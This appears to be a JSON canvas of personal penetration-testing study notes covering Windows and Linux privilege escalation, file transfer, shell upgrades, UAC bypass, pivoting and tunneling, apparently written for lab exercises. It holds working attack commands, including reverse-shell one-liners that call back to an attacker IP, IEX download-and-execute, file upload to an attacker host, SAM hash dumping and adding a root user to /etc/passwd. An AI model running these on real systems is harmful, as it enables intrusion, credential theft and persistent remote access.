{
	"nodes":[
		{"id":"ebaa5dfb21867981","type":"text","text":"# Privilege Escalation","x":-245,"y":-91,"width":325,"height":71,"color":"1"},
		{"id":"6e1609f54927f42c","type":"text","text":"# Windows\n\n# Enumeration\n\n## Tools\n\nWinpeas - [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)\n\nPrivescCheck - [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)\n\n- You may need to bypass execution policy restrictions\n\t- `Set-ExecutionPolicy Bypass -Scope process -Force`\n\t- `. .\\PrivescCheck.ps1`\n\t- `Invoke-PrivesCheck`\n\nWES-NG: exploit script that doesn't involve uploading. Run from attacking machine\n- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)\n- `Wes.py --update` first\n- Run `systeminfo` command on the target first, it will pull results from that\n- `Wes.py systeminfo.txt` (on attacking machine), this will output it to the .txt file\n\nWith MSF meterpreter. `post/windows/manage/enable_rdp` if you want an rdp session (don't migrate processes)\n\n## Manual Enumeration\n\nFile permissions: `icacls [file]`\n- `Icacls [file] /grant [user]:F`\n-  or `Everyone:F` for everyone\n- `F` is full\n- `AD` is create subdirectories\n- `WD` is create files\n\nUser Info\n- `net user`\n- User Passwords:\n\t- Stored in `/system32/config/SAM`\n\t- Change user password: `net user [user] [new_pass]`\n\nPowershell history\n- `type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt`\n- View History (cmd prompt version) - `type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt`\n\nSaved Credentials\n- `Cmdkey /list`\n\t- Use these with: `runas /savecred /user:[admin] [executable]`\n\t- You will need the password if there is one\n\nInternet Information Service (web server)\n- Stored in web.config, possible locations:\n\t- `C:\\inetpub\\wwwroot\\web.config`\n\t- `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config`\n\t- Find database connections for ISS: `type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString`\n\nPuTTY\n- Retrieve stored proxy credentials\n\t- `reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s`\n\nScheduled Tasks\n- `Schtasks`\n- list tasks with `schtasks /query /fo LIST`\n- To see more details about one of them: `schtasks /query /tn [task name] /fo list /v`\n- The taskname is the executable\n- The \"task to run\" parameter indicates the path to the file that runs the executable as a task (.bat file)\n- If we have write permissions for the .bat file:\n\t- If you can modify: `echo c:[executable_path] -e cmd.exe ATTACKER_IP 4444 > [\"task to run\" file path]` (creates a reverse shell)\n- `tasklist /SVC`\n\nLocal Network Info\n- `arp -a` arp cache\n- `route print`\n- `ipconfig /all`\n- `netstat -ano`\n\n## Unpatched Software\n\n- `Wmic` lists software installed on target (powershell)\n\t- `Wmic product get name,version,vendor` will dump installed software","x":-399,"y":-960,"width":819,"height":660,"color":"5"},
		{"id":"7471463259b72e72","type":"text","text":"# Dangerous Privileges\n\n\n`Whoami /priv` to check privileges\n`getprivs` in meterpreter\n`net users` in CMD, `net localgroup`\n- [https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) list of privileges\n- Privileges that are specifically exploitable: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)\n- It said disabled in the THM room but we still had them?\n\n#### SeBackup / SeRestore\n- Allow users to read and write to any file on the system, ignoring DACL.\n- You can probably run cmd prompt as admin with this\n- You can backup the SAM and SYSTEM hashes:\n\t- `Reg save hklm\\system C:\\[wherever]\\system.hive`\n\t- `Reg save hklm\\sam C:\\[wherever]\\sam.hive`\n- You will need to get these on your machine.\n\t- You can use the `download` command if you're using `evil-winrm`\n- To read the hashes: `pypykatz registry --sam sam system`\n\n\n#### SeTakeOwnership\n- Allows user to take ownership of any object on the system\n- You could take ownership of a service executable running as SYSTEM\n- `Takeown /f [path to executable]`\n- Being the owner doesn't mean you have privileges, you still need to assign them with `icacls`\n- In this example we used `copy` to replace utilman.exe with a cmd.exe, so when it runs it will give us a command prompt with SYSTEM privileges\n- Lock the screen, and run the 'ease of access' on the lock screen to activate utilman\n\n#### SeImpersonate / SeAssignPrimaryToken /SeCreateToken\n- Allows services to be executed on behalf of another user. \n- Incognito module in MSF\n\t- `load incognito`\n\t- `list_tokens -u`\n\t- Delegation tokens are from interactive logons\n\t- Impersonation tokens are from non-interactive logons\n\t- `impersonate_token \"[token]\"`\n- You can use `PrintSpoofer.exe -i -c powershell` and open an escalated powershell prompt\n\n","x":420,"y":-1880,"width":640,"height":554},
		{"id":"17a4e6b2601bafc5","type":"text","text":"# Service Misconfigurations\n\n#### Insecure Service Executable Permissions\n- `Sc qc [service]` shows you the configuration of a particular service\n- Binary path is here\n- `Service_start_name` shows you the account used to run the service\n- Follow enumeration techniques to see if you can overwrite the file (in the example, Everyone had (M) which is modify).\n- Replace with a reverse shell or something from msfvenom `windows/x64/shell_reverse_tcp`\n- Use a python server and wget (powershell) to move the payload\n- Make sure you give it permissions to be executed by everyone, move it to the path of the original executable\n- `Sc stop [service]`, and then `sc start [service]` if you don't want to wait\n\n#### Unquoted Service Paths\n- Service paths that don't have quotes can be tricked if they have spaces and shit\n- `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`\n\t- Has spaces on disk sorter enterprise\n\t- It will search for `C:\\\\MyPrograms\\\\Disk.exe` first\n\t- Then `C:\\\\MyPrograms\\\\Disk Sorter.exe`\n\t- And finally `C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe` (this option is expected to succeed)\n- Obviously this doesn't work if the service is in C:\\Program Files this won't work because of administrator privileges. If you find an unquoted path somewhere else though, check permissions.\n\n#### Insecure Service Permissions\n- If the service Discretionary Access Control List (DACL) (not the service executable, but the service) allows you to modify the configuration of a service, you can have it point to a different executable.\n- You can use `accesschk64.exe` (must be in the directory that the .exe is in) to check service permissions. You might have to install this tool.\n\t- `Accesschk64.exe -qlc [service]`\n\t- You’re looking for permissions under BUILTIN\\Users and something like SERVICE_ALL_ACCESS\n- NOTE: instead of like before where we replace the executable, we are going to change the path of the executable because we can configure the service (this is a different vulnerability than the other service misconfigs).\n\t- Put the payload file wherever\n\t- Use `sc config [service] binPath= \"[file path for payload]\" obj= LocalSystem`\n\t\t- Local system is the account to run the service. LocalSystem was the highest privileged account available","x":-805,"y":-1880,"width":556,"height":554},
		{"id":"6af2ef205fb51a8c","type":"text","text":"# Linux\n\n#### Automated Tools\n\nLinpeas: [https://github.com/carlospolslop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)\nLinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)\nLinux Exploit Suggester (LES): [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\nLinux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)\nLinux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)\n\n`post/linux/gather/enum_configs`\n- `enum_network`\n- `enum_system`\n\n\n#### Enumeration\n\n- `Hostname` command will return name of target machine\n- `Uname -a` will print system information\n- `getuid`\n\t- `groups [user]`\n\t- `cat /etc/group`\n- `df -h` prints storage devices mounted to the system\n- `/proc/version` has info about kernel\n- `/etc/issue` has info about operating system\n- `/etc/passwd` can discover users or `/etc/shadow`\n\t- Use `cat /etc/passwd | cut -d \":\" -f 1`\n\t- This command will only return the usernames and can be a nice brute-force list\n\t- Cat `/etc/passwd | grep home`\n\t- This one is helpful for any users that have their folders under the home directory\n- `Sudo -l` lists commands that users can run\n\t- **If you see env_keep+=LD_PRELOAD** environment option, you can spawn a root shell with a simple C code. (in OneNote)\n- `Id` command gives user privilege level and group memberships\n- `History` command gives us earlier commands run on the system\n\n- `Ps`for processes\n\t- `-A` view all\n\t- `Ps axjf` view process tree\n\t- `Ps aux` shows info for all users\n\n\nEnvironment\n\n- `Env` shows environment variables\n\t- PATH may have a compiler or scripting language that can be used to run code on the target system\n\n- Netstat\n\t- `-a` for all listening ports and established connections\n\t- `-at` for TCP protocols\n\t- `-au` for UDP protocols\n\t- `-lt `for ports that are listening using TCP\n\t- `-tp` list connections and PID\n\t- Common usage is `netstat -ano`\n\t\t- `-a` for all ports and connections\n\t\t- `-n` for do not resolve names\n\t\t- `-o` display timers","x":-420,"y":176,"width":900,"height":504,"color":"2"},
		{"id":"c2930116aaed0a07","type":"text","text":"# SUID/GUID\n\n`rwsr-rwx-rwx` - SUID, executed with same permissions as file owner\n\n`rwx-rws-rws` GUID, executed with same permissions as group permissions\n\nFind all SUID/SGID bit sets on machine\n\t- `find / -type f -perm -04000 -ls 2>/dev/null`\n\t- Another example: `find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null`\n- USE GTFO BINS to see what you can do with any files or directories that have SUID or GUID, particularly executable files (/bin) (/usr/bin)\n\n\n\n\n\n","x":-1280,"y":860,"width":656,"height":420},
		{"id":"7de572afd5477953","type":"text","text":"# Cron jobs\n\n- Cron jobs are binaries or scripts set to run at a certain time\n- They run with the privilege of their owners, not the current user\n- `Cat /etc/crontab`\n- Check File Permissions of the cronjob folders\n\t- `/etc/crontab`\n\t- `/etc/cron.d`\n\t- `/var/spool/cron/crontabs/root`\n- PATH environment variable\n- Wild Cards\n\t- View the contents of the other cronjob script - `cat /usr/local/bin/compress.sh`\n\t- If something is being run with a wildcard it will have *","x":-520,"y":855,"width":550,"height":425},
		{"id":"cd1fad5465981a2a","type":"text","text":"# PATH Variable\n\nPATH is an environment variable in Linux that tells the operating system where to search for a executables. If you try to run a program that does not have a standard binary path or isn't built into the shell, Linux uses the PATH variable to search for the executable.\n\n- `Echo $PATH`\n- Questions to answer before trying to exploit PATH:\n\t- What folders are in PATH?\n\t- Do you have any write privileges for them?\n\t- Can you modify $PATH?\n- Search for writeable folders:\n\t- `Find / -writable 2>/dev/null`\n\t- Another example that might help clean up the results:\n\t- `find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u`\n\n- Add something to PATH:\n\t- `Export PATH=/tmp:$PATH` (adds /tmp to path)\n\t- This will help add the directory that our script is in\n\t- You want to add a writeable directory to path\n\t- for example, an executable with SUID bitset is running the `cat` command. Add a file `/tmp/cat` and put it in the PATH variable. Now your new file will run with those privileges. (set chmod for new file)\n\n- You can write a script that searches for your fake binary [https://i.imgur.com/qX7m2Jq.png](https://i.imgur.com/qX7m2Jq.png)\n\t- When you find a writeable folder, write your script in it. (compile it if you need to).\n\t- Your binary will do something like `cat flag.txt`\n\t- Add the directory that these things are in to PATH\n\t- Set file permissions chmod `+x [fake binary]`\n\t- Run your script","x":140,"y":855,"width":520,"height":425},
		{"id":"1fb61a5241457cc5","type":"text","text":"# FIND\n\n`find . -name flag1.txt` : find the file named \"flag1.txt\" in current directory\n\n`-find`\n\t`-name`\n\t`-perm a=x` finds executables\n\t`-user [user]` finds files for a certain user\n\t`-writeable -type d 2>/dev/null` find world-writeable folders\n\t`-perm -222 -type d 2>/dev/null` find world-writeable folders\n\t`-perm -o w -type d 2>/dev/null` find world-writeable folders\n\t`-type`\n\t\t`-d` is directory\n\t\t`-f` is file\n\t\t`-f perm 0777` find files with the 777 permissions\n\t-Other stuff:\n\t\t`find / -group [group] 2>/dev/null` to find binaries within a group that your user has permissions for\n\t\t`find / -writable -type d 2>/dev/null` find writeable folders (`writable` is spelled wrong here)\n\tFind all SUID/SGID bit sets on machine\n\t\t- `find / -type f -perm -04000 -ls 2>/dev/null`\n\t\t- Another example: `find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null`\n","x":-1520,"y":120,"width":656,"height":504},
		{"id":"0aeaba9d3f5c6601","type":"text","text":"# Capabilities\n\nCapabilities are a method that administrators can use to increase privilege level of a process or binary.\n\n`Get-cap` to list enabled capabilities\n\t- `Get-cap -r / 2>/dev/null`  will redirect error messages to /dev/null (there will be a lot of error messages)\n\t- This will return all files with capabilities, view GTFO bins for further exploitation","x":760,"y":843,"width":560,"height":437},
		{"id":"b9266283750e0adb","type":"text","text":"# Weak File Permissions\n\nIf a writeable executable, try this one-liner (it's a bash shell connect)\n\t - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [port] >/tmp/f'`\n\n\n`Etc/shadow`\n- Contains password hashes\n- May be readable or writeable\n- Use` ls -l` to view the bitset\n- If you can read, copy password hashes and crack them.\n- If you can write, replace a hash with one you created (goes between first and second colons)\n\n`Etc/passwd`\n- Contains info about user accounts\n- Some versions of linux may still have password hashes stored here\n- Readable - gather info\n- Writeable - replace hashes\n- Writeable - add a user with root privileges\n\t- You'll need to use something like `openssl passwd -1 -salt THM password1` to create a password hash and add it to the file\n\t- This gives the hash the salt from THM and the hashed password is password1\n\t- You still need to add a username at the beginning of the line in the `/passwd` file\n\t- After the hash, add `:0:0:root:/root:/bin/bash` to get root privileges for the new user's shell","x":-1060,"y":1573,"width":815,"height":547},
		{"id":"f850d055c9759d0e","type":"text","text":"# Passwords and Keys\n\nHistory Files\n- If a user has ever typed their password on the command line instead of the password prompt, it may have been recorded\n- View contents of all hidden history files in user's home directory\n\t- `cat ~/.*history | less`\n\nConfig files\n- Config files may contain passwords in plaintext or reversible formats.\n- In this example it was an .ovpn file. It contained a reference to another location where credentials can be found.\n\nSsh keys\n- found in `/home/user/.ssh/id_rsa`\n- or `/root/.ssh/id_rsa`\n\t- try to make a public key and add it here\n- Sometimes users make backups of important files but don't secure them with correct permissions\n- Look for hidden files and directories in the system root - `ls -la /`\n- Search hidden directories - `ls -l /[hidden directory]`\n- Copy keys that you find to your attacking machine. Don't forget to give it the correct permissions.","x":0,"y":1573,"width":440,"height":547},
		{"id":"fa3a68da3d188fb2","type":"text","text":"# NFS\n\nShared folders with certain privilege level\nFind a root SSH private key on the target machine and connect with SSH to get root privilege shell\n\nNFS config: `/etc/exports`\n- If `no_root_squash` is enabled , you can create an executable with SUID bit set\n\nProcess (done in a root terminal)\n- Enumerate mountable shares from YOUR machine: showmount -e [target IP]\n- Create a place to mount the share\n\t- `Mkdir /tmp/target_share`\n- Mount the share to that place\n\t- `Mount -o rw [target_ip]:/[share_name] /tmp/target_share`\n\t- This mounts the share to the place we created, target_share\n\n- Navigate to mounted share location, create executable\n\t- [https://i.imgur.com/nWKpFkK.png](https://i.imgur.com/nWKpFkK.png)\n\t- Compile and add -w option to gcc, set +s SUID bit\n- Should be present on the target machines copy of the share with appropriate permissions. Run executable","x":720,"y":1573,"width":707,"height":547},
		{"id":"f038f2ef02d43e20","type":"text","text":"# nc64.exe (netcat)\n\nget it on the target\n\n`echo C:\\[path]\\nc64.exe -e cmd.exe [your_IP] [port] > C:\\[path]\\[vulnerable executable/script]`","x":-180,"y":-1840,"width":480,"height":380},
		{"id":"6a6379e3525d3a27","type":"text","text":"# File Transfer\n\n## Without network communication:\n\nDo a base64 encode (example file is `id_rsa`)\n- `md5sum idrsa` to check hash (your machine)\n- `cat id_rsa | base64 -w 0;echo` will echo a base64 encoded version\n- paste the encoded version in powershell\n\t- `[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"encoded payload\"))`\n- Check MD5 sum\n\t- `Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5`\n\nFile Download\n- `(New-Object Net.WebClient).DownloadFile('Target URL', 'Output File')`\n- To download as a string instead of file:\n\t- `IEX (New-Object Net.WebClient).DownloadString('string')`\n\t- or `(New-Object Net.WebClient).DownloadString('string') | IEX`\n\n## With Network Communications:\n\n`wget` in POWERSHELL\n`wget [link] -outfile [file name]`\n\nMeterpreter\n- go to `C:\\\\Users\\\\[user]\\\\AppData\\\\Local\\\\Temp`\n- `upload [file]`\n#### SMB\n\n- Make a server on your machine with impacket (unauthenticated)\n\t- `sudo impacket-smbserver share -smb2support /tmp/smbshare`\n\t- Powershell: `copy \\\\192.168.220.133\\share\\nc.exe`\n- Authenticated version if you are required to use authenticated access\n\t- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`\n\t- Powershell: `net use n: \\\\192.168.220.133\\share /user:test test`\n\n#### FTP \n\nDownload from our FTP server\n- `sudo python3 -m pyftpdlib --port 21`\n- Powershell `(New-Object Net.WebClient).DownloadFile('ftp://[IP]/[file]', '[output file]')`\n\nUpload to our FTP server\n- `sudo python3 -m pyftpdlib --port 21 --write`\n- Powershell: `(New-Object Net.WebClient).UploadFile('ftp://[IP]/[output file]', '[file to upload]')`\n\n#### Other file upload methods \n\nPython Upload Server - upload something like the host file\n- `python3 -m uploadserver`\n- On powershell, download the PSUpload.ps1 script to perform upload operations\n\t- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`\n- Upload File: `Invoke-FileUpload -Uri http://[attacker-IP]:8000/upload -File [file to upload]`\n\nPowerShell Base64 Upload (host file as example)\n- Encode a file: `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))`\n- Send to target: `Invoke-WebRequest -Uri http://[attacker-IP]:[listener-port]/ -Method POST -Body $b64`\n- Make sure you have a `nc` listener set up\n- Read the file: `echo <base64> | base64 -d -w 0 > hosts`\n\n### RDP\n\nYou can copy/paste, but sometimes this is disabled\n\nMount a directory from host machine: `rdesktop [target] -d [hostname/domain] -u [target_user] -p '[password]' -r disk:linux='[file path you want to mount]'`\n- This command will log you in via RDP and also mount the directory\n- visit the network location `tsclient` on the windows machine to see the mounted folder\n- I'm not sure the hostname matters.\n\n\n","x":-290,"y":-2600,"width":700,"height":540},
		{"id":"2b6e1c4ed9322179","type":"text","text":"# Shell Upgrade\n\nUpgrade from shitty shell\n`python3 -c 'import pty;pty.spawn (\"/bin/bash\")'`\n\nfrom VIM\n`vim -c ':!/bin/sh'`\nor `:set shell=/bin/sh` and then `:shell` from inside vim\n\nWith some kind of application command execution (SQL, etc)\n`bash -c \"bash -i >& /dev/tcp/{your_IP}/443 0>&1\"`\n\tset up a listened with port 443\n\t\tThen continue with python one above\n\t\twon't work if shell dies too quickly","x":660,"y":30,"width":548,"height":292},
		{"id":"606ea74494f03f83","type":"text","text":"# File Transfers\n\n### No Network Comms\n\n`scp` if ssh is enabled\n\nFile Hash and Base64 encoding\n- `md5sum id_rsa`\n- `cat id_rsa | base64 -w 0;echo`\n- Target: `echo -n '[string]' | base64 -d > id_rsa`\n- check sum again\n\n\n### Network Comms\n\n`wget [link] -O [output]`\n`curl [link] -o [output]` \nadditionally, instead of supplying an out file, you can execute files by piping directly into `python3` or `bash` \n\n`python3 -m uploadserver` or `http.server`\n\n`php -S [IP:port]`\n\nImpacket smbserver\n`smbserver.py`\n\t- `impacket-smbserver -smb2support CompData [directory for server location]`\n\t- `CompData` is the name that the target will use to refer to the share.\n\t- To transfer from target (windows example): `move [file] \\\\[host-IP]\\CompData`\n\n\n### File Transfers with Code\n\nPython\n- `python3 -c 'import urllib.request;urllib.request.urlretrieve(\"[URL to file]\", \"[output]\")'`\n\nPHP\n- `php -r '$file = file_get_contents(\"[file URL]\"); file_put_contents(\"[output]\",$file);'`\n\n","x":660,"y":398,"width":548,"height":282},
		{"id":"e50538e9b64c8239","type":"text","text":"# Bypass UAC\n\nAdministrator localgroup required\nUAC is the \"Do you want to allow this app to make changes to your device?\" prompt\n\nWhy do we need to do this?\n- You should already have access with an account that belongs to the \"local administrators\" group, but because we are in a shell we can't bypass the consent dialogue box\n- UAC must be on default settings (not highest but default security setting)\n- We need the highest privilege account in order to execute something that won't need the consent prompt\n\nMSF `/exploit/windows/local/bypassuac_injection`\n- set payload to something like `/windows/x64/meterpreter/reverse_tcp` or something that matches system architecture\n- I had to `set target 1` which doesn't show as an option but was in the lab... the meterpreter session was 1, maybe that's why?\n\nhttps://github.com/hfiref0x/UACME UACMe tool\n- check out usage and look at all the methods\n- `akagi64 [key] [param]` where key is the method number, param is the thing you want to execute\n- find method designed for whatever OS your target is running on\n- upload a reverse shell which will be used in conjunction with the Akagi executable which will give you an elevated session (same user, more privileges)","x":1220,"y":-1742,"width":640,"height":482},
		{"id":"2aa05b57fc5a5f5a","type":"text","text":"# When you have credentials:\n\n`evil-winrm -i [IP] -u [user] -p [password]`\n\nIf credentials for SMB, use PSExec if windows to run commands (you can use msf `exploit/windows/psexec`)\n\nIf you get credentials of an elevated user, `runas.exe /user:[elevated_user] cmd`\n\ncrack windows hashes `auxiliary/analyze/crack_windows`\n- this is easy if you started the MSF database, had a meterpreter shell, and did `hash_dump`\n- `creds` will show you gathered things\n- after running `crack_windows` use `creds` again to see plaintext","x":610,"y":-1160,"width":598,"height":280},
		{"id":"555e1214573888af","type":"text","text":"# Processes\n\nConsider migrating to a process that has the same architecture as the system (x64, etc)\n\nmigrate to a PID with higher privileges (running `ps` on meterpreter should show them)\n\nmeterpreter\n- `ps`, `getpid`, `pgrep [process]`, `migrate [PID]`","x":680,"y":-412,"width":459,"height":225},
		{"id":"4c60e8c5df7309ff","type":"text","text":"# Shell Upgrade\n\nTo switch to a meterpreter shell, you can use the `exploit/windows/misc/hta_server` in metasploit. \n- It will generate a URL payload that you can copy and paste into the powershell session that will connect back to MSF and start the meterpreter session. \n- On the target: `mshta.exe [URL_payload]` (mshta.exe is a regular executable under System32 that can execute code embedded in HTML, hta stands for HTML Application) (you might have to foreground the session in msf, it went background for me automatically)\n\nTo switch to RDP with meterpreter\n- `run getgui -e -u [user] -p [pass]`\n- this will create a new user and enable RDP access for them","x":1401,"y":-1040,"width":639,"height":460},
		{"id":"5103bbc095080cb2","type":"text","text":"# Check Priv in meterpreter\n\n`sysinfo`, `getuid`, `getprivs`\n\n\n","x":514,"y":-2122,"width":452,"height":124},
		{"id":"522b26204208ae98","type":"text","text":"### Service Creation\n\nif we have local admin privileges but want SYSTEM privileges, we can create a Windows service that will run as Local System and will execute binaries with SYSTEM privileges. https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create\n\n`sc.exe create sessionhijack binpath = \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\"`\n- we created the service `sessionhijack`\n- the binary it executes is `cmd.exe` with the added arguments\n- in this case, we ran `tscon` which is used to hijack an RDP session from another user (see MS protocols under exploitation)\n- `net start sessionhijack` to run\n","x":1360,"y":-425,"width":559,"height":251},
		{"id":"9b85df9bac3f6948","type":"text","text":"# Pivoting\n\n#### Windows\n\nWindows: `net view [target-IP]` to see what foothold machine can access on internal target\n- If any shared resources, mount them with `net use D: \\\\[target]\\[drive_name]`\n- note that the `D:` can be any arbitrary drive letter that you make\n\n`arp -a` in CMD will show discovered network devices\n\n","x":2280,"y":-200,"width":540,"height":274},
		{"id":"0145bc0ac0b02a02","type":"text","text":"# Tunneling\n\n`ss`\n- shows sockets running on a host\n- `-t` show TCP sockets\n- `-u` show UDP sockets\n- `-l` display listening sockets\n- `-p` shows the process using the socket\n- `-n` doesn't resolve service names\n### SSH Tunnel\n\n- `ssh -L [lport]:localhost:[rport] user@IP`\n\t- Both machines will encapsulate their traffic using ssh port 22\n\t- `lport` is the listening port on our machine that we want to receive the traffic to and send traffic from\n\t- `rport` is the port on the target machine that we want the traffic from\n\t- You can execute multiple of these in one command by repeating the `-L` flag with new arguments.\n\t- Ex. forwarding both MySQL and HTTP from target to our machine: `ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@IP` \n- To confirm the tunneling, `nmap -sV -p1234 localhost` \n\n### SOCKS Tunneling with SSH\n\n`Sshuttle` is a Python tool that removes the need for proxychains.\n- `sudo sshuttle -r victim@IP 172.16.5.0/23 -v`\n\t- This command routes traffic to the listed address range through the victim host connection.\n\n- For pivoting from a foothold to an internal host\n- `ssh -D 9050 user@IP`\n\t- `-D` enables dynamic port forwarding\n- `/etc/proxychains.conf`\n\t- `#defaults set to \"tor\" \\ socks4 127.0.0.1 9050`\n- Now, running `proxychains [tool]` it will route all traffic to port 9050, where ssh is listening and forwarding through the foothold host\n\t- NOTE for nmap: You can only use **full TCP connect scans** with proxychains because it can't use partial packets.\n\t- May also need to disable ping probe\n- Example tools to use over socks tunnel:\n\t- You can also start `proxychains msfconsole` to use metasploit over our tunnel\n\t- `proxychains xfreerdp`\n\n#### With `metasploit`\n- Once you have a meterpreter shell, `use auxiliary/server/socks_proxy`\n\t- set `srvport` to 9050 (from `proxychains.conf`)\n\t- set `srvhost` to 0.0.0.0\n\t- set version to same version from `proxychains.conf` (usually 4a)\n\t- `jobs` to verify it's running\n- now use `post/multi/manage/autoroute` to route traffic through the meterpreter session\n\t- set `session` \n\t- set `subnet` to internal subnet on pivot machine\n- instead of the module you can also `run autoroute -s 172.16.5.0/23` from the meterpreter shell\n\t- `run autoroute -p` to verify the routing table is correct\n- You can also portforward with the meterpreter session. If you want to learn that go visit the module again.\n\n\n### Reverse Port Forward with SSH\n\n- First, get the shell payload on the internal host. You can use `scp` to get it on the pivot host, and then another kind of transaction such as HTTP server to get it to the internal host.\n\t- Make sure your payload is set to connect to the **pivot hosts** IP and port.\n- Configure ssh tunnel with `-R` to forward traffic from the internal IP address of the pivot host:\n\t- `ssh -R [internal_IP_of_foothold]:9999:0.0.0.0:8000 -vN`\n\t- In this case, our reverse shell is being caught on port `9999` of the foothold host, and it should be received by our listener on `8000`\n\t- When establishing the ssh tunnel, use `-vN` for verbosity and to not prompt the login shell.\n\n#### Socat Redirection\n\n- Reverse shell:\n\t- Once logged into target, you can use `socat` to create a pipe socket between 2 hosts.\n\t- `socat TCP4-LISTEN:8080,fork TCP4:[attacker_IP]:[listener_port]`\n\t- This will listen on the local port 8080 and forward back to our machine on the port of our choosing. This is good for pivoting if we have an internal machine that is communicating to the foothold host on port 8080.\n- Bind shell:\n\t- same process, but have the foothold machine forward data to the `internal host` rather than `attacker machine`. \n\t- On meterpreter, use something like `windows/x64/meterpreter/bind_tcp` and set `rhost [foothold_IP]` and `LPORT 8080`.\n\t- Since we set up the `socat` listener on 8080, the foothold will receive our bind_tcp payload and forward it to the internal host.\n\n","x":2526,"y":-980,"width":900,"height":500},
		{"id":"68da7e4eb3e4d7f4","type":"text","text":"# Persistence\n\n`exploit/windows/local/persistence_service` with meterpreter shell","x":2301,"y":160,"width":451,"height":150},
		{"id":"35f96a37821ece59","type":"text","text":"# Pivoting Around Obstacles\n\n\n#### SSH Pivoting\n\n- `Sshuttle` is a Python tool that removes the need for proxychains for ssh specifically.\n- `sudo sshuttle -r victim@IP 172.16.5.0/23 -v`\n\t- This command routes traffic to the listed address range through the victim host connection.\n\n#### Web Server Pivot\nDoes not work with Python3!\n\n- `Rpivot` is a reverse SOCKS proxy tool that will let you connect to internal web server through an external pivot host.\n\t- `git clone https://github.com/klsecservices/rpivot.git`\n- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`\n\t- This will have the attack machine serve on port 9999 for the victim to connect to\n- Transfer `rpivot` directory to web server victim with `scp`\n- on victim server: `python2.7 client.py --server-ip [attacker-IP] --server-port 9999`\n- Now use `proxychains firefox-esr [internal_IP]:80` to connect to the internal webserver.\n\t- You can add NTLM authentication if necessary for the internal server.\n\t- Add the following in addition to the arguments above: `--ntlm-proxy-ip` , `--ntlm-proxy-port` , `--domain` , `--username` , `--password` \n\n#### Windows Port Forward with Netsh\n(sometimes requires command prompt to be run as administrator to use netsh)\n\n- `Netsh` is a Windows tool that can do several network config tasks such as find routes, view firewall configs, add proxies, and create port forwarding rules. If we have a Windows pivot host, `Netsh` affords us these options for pivoting.\n- Port forward: `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=[pivot_IP] connectport=3389 connectaddress=[internal_IP]`\n- To verify forwarding: `netsh.exe interface portproxy show v4tov4`\n- You can now connect to the Windows pivot host with the attacking machine and RDP to the internal host through the port we forwarded (`[pivot_IP]:8080`)\n\n#### From a Windows Attack Host\n\n- `plink.exe` is a PuTTY Link tool that acts as an ssh server for linux hosts. Before 2018, Windows did not have an ssh client and PuTTY was necessary.\n- `plink -ssh -D 9050 hostname@IP_address`\n\t- This would be used from a Windows attack host to a victim Linux server.\n\t- It establishes local port 9050 for dynamic port forwarding through ssh on the linux target.\n- `Proxifier` can be used to start a SOCKS tunnel via the ssh session from `plink`\n\t- Configure the SOCKS server for 127.0.0.1 and the port 9050 we used earlier. Start `mstsc.exe` to begin an RDP session with a Windows target that allows RDP.","x":3100,"y":-210,"width":680,"height":295},
		{"id":"acc6bdb0d34b8111","type":"text","text":"# See more pivoting options under Fundamentals","x":2812,"y":-1360,"width":328,"height":128},
		{"id":"aed968e829d9aa76","type":"text","text":"# Web Escalation\n\n#### File Upload Shell\nif you get access as `www-data` or an application name, check `/var/www/html` for stored credentials and information\n- view hidden files as well\n- Windows check `htdocs`, `xampp`","x":-1240,"y":-370,"width":620,"height":400},
